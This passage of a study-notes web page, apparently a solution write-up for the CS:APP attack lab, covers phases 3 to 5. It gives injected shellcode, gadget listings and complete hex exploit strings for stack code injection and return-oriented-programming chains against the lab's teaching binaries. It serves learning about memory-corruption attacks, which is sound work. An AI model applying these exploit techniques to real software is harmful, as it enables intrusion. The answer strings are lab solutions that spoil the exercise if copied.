<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Touch3!: You called touch3(</span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s">)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">sval</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">validate</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Misfire: You called touch3(</span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s">)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">sval</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">fail</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
</div>
<input id="__tabbed_4_2" name="__tabbed_4" type="radio" /><label for="__tabbed_4_2">hexmatch</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code><span class="cm">/* Compare string to hex represention of unsigned value */</span><span class="w"></span>
<span class="kt">int</span><span class="w"> </span><span class="nf">hexmatch</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="n">val</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">sval</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">cbuf</span><span class="p">[</span><span class="mi">110</span><span class="p">];</span><span class="w"></span>
<span class="w">    </span><span class="cm">/* Make position of check string unpredictable */</span><span class="w"></span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cbuf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">random</span><span class="p">()</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">100</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">sprintf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;%.8x&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">val</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">strncmp</span><span class="p">(</span><span class="n">sval</span><span class="p">,</span><span class="w"> </span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="mi">9</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
</div>
<input id="__tabbed_4_3" name="__tabbed_4" type="radio" /><label for="__tabbed_4_3">phase3.s</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code><span class="nf">pushq</span>  <span class="no">$0x4018fa</span>          <span class="c1"># first address of touch3</span>
<span class="nf">mov</span>    <span class="no">$0x5561dca8</span><span class="p">,</span> <span class="nv">%rdi</span>  <span class="c1"># address of string constructed manually</span>
<span class="nf">ret</span>
</code></pre></div>
</div>
<input id="__tabbed_4_4" name="__tabbed_4" type="radio" /><label for="__tabbed_4_4">phase3.d</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code><span class="mh">0000000000000000</span> <span class="p">&lt;</span><span class="nf">.text</span><span class="p">&gt;:</span>
<span class="x">    0:  68 fa 18 40 00          pushq  $0x4018fa</span>
<span class="x">    5:  48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi</span>
<span class="x">    c:  c3</span>
</code></pre></div>
</div>
<input id="__tabbed_4_5" name="__tabbed_4" type="radio" /><label for="__tabbed_4_5">phase3.txt</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code><span class="go">/* padding: 40 bytes */</span>
<span class="go">ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee</span>
<span class="go">ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee</span>

<span class="go">/* return: injected codes at 0x5561dca0 + 8 + 9 */</span>
<span class="go">b1 dc 61 55 00 00 00 00</span>

<span class="go">/* string format of cookie */</span>
<span class="go">35 39 62 39 39 37 66 61 00</span>

<span class="go">/* encoding of injected codes */</span>
<span class="go">68 fa 18 40 00 48 c7 c7 a8 dc 61 55 c3</span>
</code></pre></div>
</div>
</div>
<p>因此在栈帧尾部顺放 cookie 的字符串形式，再放置注入的代码。尽管 <code>touch3</code> 调用其他函数，但注入内容都放在了 <code>test</code> 的栈帧内，不必担心被破坏。</p>
<h3 id="part-ii-return-oriented-programming">Part II: Return-Oriented Programming<a class="headerlink" href="#part-ii-return-oriented-programming" title="Permanent link">🧐</a></h3>
<p><code>rtarget</code> uses two techniques to thwart such attacks:</p>
<ul>
<li>Uses randomization, so the stack positions differ from one run to another.</li>
<li>Marks the section of memory holding the stack as nonexecutable, so even if you could set the
    program counter to the start of your injected code, the program would fail with a segmentation fault.</li>
</ul>
<p>The strategy with ROP is to <u>identify byte sequences within an existing program</u> that consist of one or more instructions followed by the instruction <code>ret</code>.</p>
<p><font class="i_n_a%10&10_b%10&110" id="setting up stack">
<img src="../img/gadgets.png" width=540>
</font></p>
<p>Gadgets may not be enough to implement many important operations. Fortunately, with a byte-oriented instruction set, such as x86-64, a gadget can often be found by extracting patterns from other parts of the instruction byte sequence. For example:</p>
<div class="tabbed-set" data-tabs="5:2"><input checked="checked" id="__tabbed_5_1" name="__tabbed_5" type="radio" /><label for="__tabbed_5_1">setval_210.c</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">setval_210</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="o">*</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3347663060U</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
</div>
<input id="__tabbed_5_2" name="__tabbed_5" type="radio" /><label for="__tabbed_5_2">setval_210.d</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code><span class="mh">000000000400f15</span> <span class="p">&lt;</span><span class="nf">setval_210</span><span class="p">&gt;:</span>
<span class="x">    400f15:     c7 07 d4 48 89 c7     movl  $0xc78948d4, (%rdi)</span>
<span class="x">    400f1b:     c3                    retq</span>
</code></pre></div>
</div>
</div>
<p>The byte sequence <code>48 89 c7</code> encodes the instruction <code>movq %rax, %rdi</code>. Thus, this code contains a gadget, having a starting address of <code>0x400f18</code>.</p>
<!-- prettier-ignore-start -->
<details class="hint"><summary>byte encoding of instructions</summary><p><img src="../img/gadgeti1.png"><br>
<img src="../img/gadgeti2.png"></p>
</details>
<!-- prettier-ignore-end -->

<h4 id="phase4">phase4<a class="headerlink" href="#phase4" title="Permanent link">🧐</a></h4>
<p>使用 gadget farm 中的 gadget (最多两个)，对 <code>rtarget</code> 做和 phase2 一样的事:</p>
<ul>
<li>首先修改返回地址，使之跳转到第一个 gadget</li>
<li>gadget 需要把 cookie <code>pop</code> 到一个寄存器 <code>r</code>，然后 <code>mov r, %rdi</code>，最后返回到 <code>touch2</code></li>
</ul>
<p>因此，首先搜索 <code>pop r</code> 的编码，然后再搜索对应的 <code>mov r, %rdi</code> 编码</p>
<div class="tabbed-set" data-tabs="6:2"><input checked="checked" id="__tabbed_6_1" name="__tabbed_6" type="radio" /><label for="__tabbed_6_1">used gadgets</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code><span class="mh">00000000004019a7</span> <span class="p">&lt;</span><span class="nf">addval_219</span><span class="p">&gt;:</span>
<span class="x">4019a7: 8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax</span>
<span class="x">4019ad: c3                      retq</span>
<span class="x">... ...</span>
<span class="mh">00000000004019c3</span> <span class="p">&lt;</span><span class="nf">setval_426</span><span class="p">&gt;:</span>
<span class="x">4019c3: c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)</span>
<span class="x">4019c9: c3</span>
</code></pre></div>
</div>
<input id="__tabbed_6_2" name="__tabbed_6" type="radio" /><label for="__tabbed_6_2">phase4.txt</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code><span class="go">/* padding: 40 bytes */</span>
<span class="go">ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee</span>
<span class="go">ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee</span>

<span class="go">/* gadget1: pop %rax; retq (58 c3) */</span>
<span class="go">ab 19 40 00 00 00 00 00</span>

<span class="go">/* cookie */</span>
<span class="go">fa 97 b9 59 00 00 00 00</span>

<span class="go">/* gadget2: movq %rax, %rdi; retq (48 89 c7 c3) */</span>
<span class="go">c5 19 40 00 00 00 00 00</span>

<span class="go">/* first address of touch2 */</span>
<span class="go">ec 17 40 00 00 00 00 00</span>
</code></pre></div>
</div>
</div>
<h4 id="phase5">phase5<a class="headerlink" href="#phase5" title="Permanent link">🧐</a></h4>
<p>做和 phase3 的一样的事，即传入一个字符串的地址；难点在于，由于栈随机化，需要使用 <code>%rsp</code> 的值。首先在 gadgets 中查找可用的 <code>mov</code> pattern:</p>
<p><font class="t_a%0&0_b%40_h%3&0"></p>
<table>
<thead>
<tr>
<th align="left">byte encoding</th>
<th align="left">instruction</th>
<th align="left">address</th>
</tr>
</thead>
<tbody>
<tr>
<td align="left"><code>48 89 c7 90 c3</code></td>
<td align="left"><code>movq %rax, %rdi</code></td>
<td align="left"><code>0x4019c3</code></td>
</tr>
<tr>
<td align="left"><code>48 89 e0 c3</code></td>
<td align="left"><code>movq %rsp, %rax</code></td>
<td align="left"><code>0x401a03</code></td>
</tr>
<tr>
<td align="left"><code>89 c2 90 c3</code></td>
<td align="left"><code>movl %eax, %edx</code></td>
<td align="left"><code>0x4019db</code></td>
</tr>
<tr>
<td align="left"><code>89 ce 90 90 c3</code></td>
<td align="left"><code>movl %ecx, %esi</code></td>
<td align="left"><code>0x401a11</code></td>
</tr>
<tr>
<td align="left"><code>89 d1 38 c9</code></td>
<td align="left"><code>movl %edx, %ecx</code></td>
<td align="left"><code>0x401a33</code></td>
</tr>
</tbody>
</table>
<p></font></p>
<p>gadgets 中还提供了一个 <code>add_xy</code> 函数，结合存在的 <code>mov</code> pattern，可以先由 <code>add_xy</code> 计算字符串的地址，再传入 <code>touch3</code></p>
<details class="hint"><summary>phase5 answers</summary><div class="tabbed-set" data-tabs="7:2"><input checked="checked" id="__tabbed_7_1" name="__tabbed_7" type="radio" /><label for="__tabbed_7_1">used gadgets</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code><span class="mh">00000000004019a7</span> <span class="p">&lt;</span><span class="nf">addval_219</span><span class="p">&gt;:</span>
<span class="x">    4019a7: 8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax</span>
<span class="x">    4019ad: c3                      retq</span>
<span class="x">... ...</span>
<span class="mh">00000000004019db</span> <span class="p">&lt;</span><span class="nf">getval_481</span><span class="p">&gt;:</span>
<span class="x">    4019db: b8 5c 89 c2 90          mov    $0x90c2895c,%eax</span>
<span class="x">    4019e0: c3</span>
<span class="x">... ...</span>
<span class="mh">00000000004019c3</span> <span class="p">&lt;</span><span class="nf">setval_426</span><span class="p">&gt;:</span>
<span class="x">    4019c3: c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)</span>
<span class="x">    4019c9: c3                      retq</span>
<span class="x">... ...</span>
<span class="mh">0000000000401a03</span> <span class="p">&lt;</span><span class="nf">addval_190</span><span class="p">&gt;:</span>
<span class="x">    401a03: 8d 87 41 48 89 e0       lea    -0x1f76b7bf(%rdi),%eax</span>
<span class="x">    401a09: c3                      retq</span>
<span class="x">... ...</span>
<span class="mh">0000000000401a11</span> <span class="p">&lt;</span><span class="nf">addval_436</span><span class="p">&gt;:</span>
<span class="x">    401a11: 8d 87 89 ce 90 90       lea    -0x6f6f3177(%rdi),%eax</span>
<span class="x">    401a17: c3                      retq</span>
<span class="x">... ...</span>
<span class="mh">0000000000401a33</span> <span class="p">&lt;</span><span class="nf">getval_159</span><span class="p">&gt;:</span>
<span class="x">    401a33: b8 89 d1 38 c9          mov    $0xc938d189,%eax</span>
<span class="x">    401a38: c3                      retq</span>
<span class="x">... ...</span>
<span class="mh">00000000004019d6</span> <span class="p">&lt;</span><span class="nf">add_xy</span><span class="p">&gt;:</span>
<span class="x">    4019d6: 48 8d 04 37             lea    (%rdi,%rsi,1),%rax</span>
<span class="x">    4019da: c3                      retq</span>
</code></pre></div>
</div>
<input id="__tabbed_7_2" name="__tabbed_7" type="radio" /><label for="__tabbed_7_2">phase5.txt</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code><span class="go">/* padding: 40 bytes */</span>
<span class="go">ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee</span>
<span class="go">ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee</span>

<span class="go">/* gadget1: movq  %rsp, %rax;  retq (48 89 e0 c3) */</span>
<span class="go">06 1a 40 00 00 00 00 00</span>

<span class="go">/* gadget2: movq  %rax, %rdi;  retq (48 89 c7 90 c3) */</span>
<span class="go">c5 19 40 00 00 00 00 00</span>

<span class="go">/* gadget3: popq %rax;  retq (58 90 c3) */</span>
<span class="go">ab 19 40 00 00 00 00 00</span>

<span class="go">/* bias: 72 */</span>
<span class="go">48 00 00 00 00 00 00 00</span>

<span class="go">/* gadget4: movl  %eax, %edx;  retq (89 c2 90 c3) */</span>
<span class="go">dd 19 40 00 00 00 00 00</span>

<span class="go">/* gadget5: movl  %edx, %ecx;  retq (89 d1 38 c9 c3) */</span>
<span class="go">34 1a 40 00 00 00 00 00</span>

<span class="go">/* gadget6: movl  %ecx, %esi;  retq (89 ce 90 90 c3) */</span>
<span class="go">13 1a 40 00 00 00 00 00</span>

<span class="go">/* gadget7: add_xy: %rax = %rdi + %rsi */</span>
<span class="go">d6 19 40 00 00 00 00 00</span>

<span class="go">/* gadget8: movq  %rax, %rdi;  retq (48 89 c7 c3) */</span>
<span class="go">c5 19 40 00 00 00 00 00</span>

<span class="go">/* first address of touch3 */</span>
<span class="go">fa 18 40 00 00 00 00 00</span>

<span class="go">/* string format of cookie */</span>
<span class="go">35 39 62 39 39 37 66 61 00</span>
</code></pre></div>
</div>
</div>
</details>
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
        
          <a href="../bomblab/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-footer-nav__button md-icon">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
            </div>
            <div class="md-footer-nav__title">
              <div class="md-ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                
                    bomblab
                
              </div>
            </div>
          </a>
        
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        <!-- Made with
        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
          Material for MkDocs
        </a> -->
      </div>
      
    </div>
  </div>
</footer>


      
    </div>
    
      <script src="../../../assets/javascripts/vendor.fd16492e.min.js"></script>
      <script src="../../../assets/javascripts/bundle.00f9b4e0.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
      
      <script>
        app = initialize({
          base: "../../..",
          features: ['navigation.tabs', 'toc.autohide', 'colors'],
          search: Object.assign({
            worker: "../../../assets/javascripts/worker/search.4ac00218.min.js"
          }, typeof search !== "undefined" && search)
        })
      </script>
      
        <script type="module" src="https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/katex.min.js"></script>
      
        <script type="module" src="https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/contrib/auto-render.min.js"></script>
      
        <script type="module" src="../../../js/mkmain.js"></script>
      
        <script type="module" src="../../../js/katex.js"></script>
      
    
  </body>
</html>